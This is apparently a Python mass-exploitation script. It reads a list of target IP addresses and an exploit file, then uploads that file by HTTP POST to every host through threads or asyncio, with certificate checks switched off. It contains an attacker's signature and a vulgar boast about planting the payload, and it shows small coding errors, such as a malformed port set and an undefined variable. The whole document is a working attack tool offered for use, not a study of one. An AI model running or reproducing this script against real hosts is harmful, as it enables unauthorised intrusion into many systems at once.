import aiohttp
import asyncio
import threading
import sys
import time

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
#wicked was here

ips = open(sys.argv[1], "r").readlines()
exploit_file = open(sys.argv[2], 'rb')
file = {'file': exploit_file}
print(f'There are {len(ips)} ips in the list')
ip_number: int = 0
https_ports = {
    '443',
    '8443'
    '80'
    '8080'
}

async def payload_send_async(pawn_ip):
    try:
        with open(sys.argv[2], 'rb') as exploiting_file:
            async with aiohttp.ClientSession() as session:
                http = 'https' if pawn_ip.split(':')[1] in https_ports else 'http'
                print(http)
                async with session.post(f'{http}://{pawn_ip}/$3261', data={"file": exploiting_file}, verify_ssl=False) as response:
                    print(f'Request finished on {ip}')
                    return response
    except Exception as e:
        print(e)


def payload_send(pawn_ip: str):
    print(f'{pawn_ip} STARTING')
    try:
        with open(sys.argv[2], 'rb') as exploiting_file:
            http = 'https' if pawn_ip.split(':')[1] in https_ports else 'http'
            print(http)
            response = requests.post(f'{http}://{pawn_ip}/$6341', files={"file": exploiting_file}, timeout=12, verify=False)
    except requests.exceptions.Timeout as e:
        print("FUCK YEAH BABY IM GOING TO FUCKING PUT MY PAYLOAD IN YOU")
    except:
        pass


if 'y' in input("Do you want to use multi threaded version: "):
    for ip in ips:
        ip_number += 1
        stripped_ip = ip.strip("\r\n")
        threading.Thread(target=payload_send, args=[stripped_ip]).start()
        time.sleep(0.1)
        print(f'There are {len(ips) - ip_number} left')
else:
    loop = asyncio.get_event_loop()

    multiple_requests = [payload_send_async(ip.strip('\r\n')) for ip in ips]

    results = loop.run_until_complete(asyncio.gather(*multiple_requests))

    print("Results: %s" % results)
